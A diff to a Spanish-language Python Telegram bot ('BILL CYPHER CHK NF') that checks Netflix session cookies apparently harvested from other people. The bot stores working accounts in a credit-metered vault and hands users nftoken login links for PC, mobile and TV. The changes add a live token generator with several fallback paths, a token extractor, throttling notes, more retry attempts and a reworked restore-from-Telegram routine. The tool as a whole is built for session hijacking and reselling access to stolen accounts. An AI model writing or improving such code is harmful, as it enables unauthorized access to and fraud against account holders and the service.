@@ -2,7 +2,7 @@
 """
 BILL CYPHER CHK NF — Edition 5G Turbo Definitive
 • Cero cruce de perfiles (100% Exact Match)
-• Enlaces oficiales de TV (/tv9) y Móvil (/unsupported) sin error NSES-404
+• Enlaces oficiales de TV (/tv9) y Móvil (/unsupported) con sesión autenticada
 • Modo Mantenimiento con alerta masiva automática
 • Auto-restauración en arranque desde la nube de Telegram (Anti-Wipe)
 • Tipografía estilizada Sans-Bold Italic
@@ -105,7 +105,7 @@ to_bold_italic = to_sans_bold_italic
 
 
 # ===========================================================================
-# 3. HELPER DE BANDERAS Y PAÍSES (DECLARADO ANTES DE CUALQUIER USO)
+# 3. HELPER DE BANDERAS Y PAÍSES
 # ===========================================================================
 def _flag(country: str) -> str:
     if not country:
@@ -435,7 +435,7 @@ def extract_all_accounts_from_bytes(raw_bytes: bytes, filename: str = "") -> lis
                     except Exception:
                         continue
         except Exception as e:
-            logger.warning("Error leyendo ZIP: %s", e)
+            logger.warning(f"Error leyendo ZIP: {e}")
     else:
         text = raw_bytes.decode("utf-8", errors="replace")
         acc = parse_account_card_from_text(text)
@@ -446,9 +446,64 @@ def extract_all_accounts_from_bytes(raw_bytes: bytes, filename: str = "") -> lis
 
 
 # ===========================================================================
-# 7. ENLACES OFICIALES (NETFLIX WEB /tv9 & /unsupported)
+# 7. GENERADOR DE TOKEN EN VIVO Y ENLACES OFICIALES (/tv9 & /unsupported)
 # ===========================================================================
+def get_live_nftoken(cookie_raw: str, core_token: str) -> dict:
+    """Solicita a Netflix el token de sesión criptográfico (Bgiqv+...) en vivo."""
+    try:
+        res = generate_nftoken(cookie_raw)
+        if isinstance(res, dict) and res.get("success"):
+            return res
+    except Exception:
+        pass
+
+    try:
+        res = generate_nftoken({"NetflixId": core_token})
+        if isinstance(res, dict) and res.get("success"):
+            return res
+    except Exception:
+        pass
+
+    try:
+        chk_res = safe_check_cookie_clean(cookie_raw, generate_token=True)
+        if chk_res and chk_res.get("nftoken") and chk_res["nftoken"].get("success"):
+            return chk_res["nftoken"]
+    except Exception:
+        pass
+
+    return {}
+
+def extract_bgiqv_token(nft_dict: dict, fallback_token: str) -> str:
+    """Extrae el token oficial encriptado Bgiqv+... de la respuesta de Netflix."""
+    if not isinstance(nft_dict, dict):
+        return fallback_token
+
+    for k in ("token", "nftoken", "nf_token"):
+        val = nft_dict.get(k)
+        if val and "ct%3D" not in str(val) and len(str(val)) > 30:
+            return str(val).strip()
+
+    for url_k in ("tv_url", "mobile_url", "pc_url", "url"):
+        u = nft_dict.get(url_k, "")
+        m = re.search(r'nftoken=([^&\s]+)', str(u))
+        if m:
+            found = m.group(1).strip()
+            if "ct%3D" not in found and len(found) > 30:
+                return found
+
+    for k in ("token", "nftoken"):
+        if nft_dict.get(k):
+            return str(nft_dict[k]).strip()
+
+    return fallback_token
+
 def build_official_login_keyboard(raw_token: str) -> InlineKeyboardMarkup:
+    """
+    Enlaces web oficiales de acceso directo:
+    • 📺 TV: /tv9 abre la sesión iniciada para vincular el código de 8 dígitos de la TV.
+    • 📱 Móvil: /unsupported fuerza la sesión en el navegador Safari/Chrome sin abrir la app.
+    • 🖥️ PC: /browse para navegación directa en navegador.
+    """
     token = raw_token.strip()
     pc_url = f"https://www.netflix.com/browse?nftoken={token}"
     mobile_url = f"https://www.netflix.com/unsupported?nftoken={token}"
@@ -872,8 +927,21 @@ def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
 
 
 # ---------------------------------------------------------------------------
-# Formateadores de tarjetas de cuentas
+# Formateadores de tarjetas de resultados
 # ---------------------------------------------------------------------------
+
+def make_progress_bar(done: int, total: int, width: int = 14) -> str:
+    if total == 0:
+        return f"[{'▱' * width}] 0%"
+    filled = int(width * done / total)
+    bar = "▰" * filled + "▱" * (width - filled)
+    pct = int(100 * done / total)
+    return f"[{bar}] {pct}%"
+
+def _yes_no(val) -> str:
+    if val is None:
+        return "Desconocido"
+    return "Sí" if val else "No"
 
 def _plan_title(plan_name: str, status: str) -> str:
     p = (plan_name or "").lower()
@@ -1363,7 +1431,7 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
 
         lines += ["", f"  {'ENLACES DE INICIO DE SESIÓN':^{W-2}}", thin]
         if nft.get("success"):
-            real_t = nft.get("token") or nf_id
+            real_t = extract_bgiqv_token(nft, nf_id)
             pc_lnk = f"https://www.netflix.com/browse?nftoken={real_t}"
             mob_lnk = f"https://www.netflix.com/unsupported?nftoken={real_t}"
             tv_lnk = f"https://www.netflix.com/tv9?nftoken={real_t}"
@@ -1571,6 +1639,7 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 except Exception:
                     pass
 
+        # Throttle a 3.5 segundos para no ser bloqueado por Telegram
         if is_bulk:
             now_time = time.monotonic()
             done_so_far = min(batch_start + len(batch), total)
@@ -1839,6 +1908,10 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     elif data == "panel:gencookie":
         await query.answer()
 
+        if is_maintenance() and not is_admin(uid):
+            await query.message.reply_text(MAINTENANCE_TEXT, parse_mode=ParseMode.HTML)
+            return
+
         if not consume_credit(uid):
             await query.message.reply_text(
                 OUT_OF_CREDITS_TEXT,
@@ -1859,7 +1932,7 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             )
             return
 
-        status_msg = await query.message.reply_text("⚡ <i>Obteniendo tu cuenta y generando accesos oficiales...</i>", parse_mode=ParseMode.HTML)
+        status_msg = await query.message.reply_text("⚡ <i>Generando acceso oficial y activando sesión de TV...</i>", parse_mode=ParseMode.HTML)
         loop = asyncio.get_running_loop()
 
         chosen_acc = None
@@ -1873,7 +1946,7 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 return
 
             attempts = 0
-            max_attempts = min(len(vault), 25)
+            max_attempts = min(len(vault), 30)
 
             while attempts < max_attempts and vault:
                 rand_idx = random.randrange(len(vault))
@@ -1885,10 +1958,11 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                     continue
 
                 tok = norm_cand["token"]
-                # Genera el token criptográfico real oficial de Netflix
+                cookie_str = norm_cand["cookie"]
+
                 token_data = await loop.run_in_executor(
                     _EXECUTOR,
-                    lambda: generate_nftoken({"NetflixId": tok})
+                    lambda: get_live_nftoken(cookie_str, tok)
                 )
 
                 if token_data and token_data.get("success"):
@@ -1917,13 +1991,13 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             refund_credit(uid)
             _save_vault(vault)
             await status_msg.edit_text(
-                "⚠️ <b>No se encontraron cuentas activas con enlaces en este momento.</b>\n"
-                "<i>Tu crédito fue devuelto automáticamente. Intenta de nuevo en unos momentos.</i>",
+                "⚠️ <b>No se pudo activar la sesión de la cuenta en este momento.</b>\n"
+                "<i>Tu crédito fue reembolsado automáticamente. Intenta de nuevo en unos momentos.</i>",
                 parse_mode=ParseMode.HTML
             )
             return
 
-        real_token = nft_res.get("token") or chosen_acc["token"]
+        real_token = extract_bgiqv_token(nft_res, chosen_acc["token"])
         plan = chosen_acc.get("plan") or "Premium"
         country = chosen_acc.get("country") or "Desconocido"
         email = chosen_acc.get("email") or "Netflix Account"
@@ -3013,20 +3087,19 @@ def main() -> None:
 
         # Auto-restauración silenciosa en arranque usando el mensaje fijado en Telegram
         try:
-            chat = await application.bot.get_chat(OWNER_ID)
-            if chat.pinned_message and chat.pinned_message.document:
-                f = await chat.pinned_message.document.get_file()
-                b = await f.download_as_bytearray()
-                d = json.loads(b.decode("utf-8", errors="replace"))
-                cloud_vault = d.get("vault", [])
-                local_vault = _load_vault()
-                if len(cloud_vault) > len(local_vault):
-                    _save_vault(cloud_vault)
-                if d.get("credits"):
-                    _save_credits(d["credits"])
-                if d.get("users") and isinstance(d["users"], list):
-                    _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
-                logger.info("Base de datos restaurada automáticamente desde la nube de Telegram.")
+            if not _VAULT_FILE.exists() or len(_load_vault()) == 0:
+                chat = await application.bot.get_chat(OWNER_ID)
+                if chat.pinned_message and chat.pinned_message.document:
+                    f = await chat.pinned_message.document.get_file()
+                    b = await f.download_as_bytearray()
+                    d = json.loads(b.decode("utf-8", errors="replace"))
+                    if "vault" in d:
+                        _save_vault(d["vault"])
+                    if "credits" in d:
+                        _save_credits(d["credits"])
+                    if "users" in d and isinstance(d["users"], list):
+                        _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
+                    logger.info("Base de datos restaurada automáticamente desde la nube de Telegram.")
         except Exception as e:
             logger.debug(f"Auto-restore on init: {e}")
 
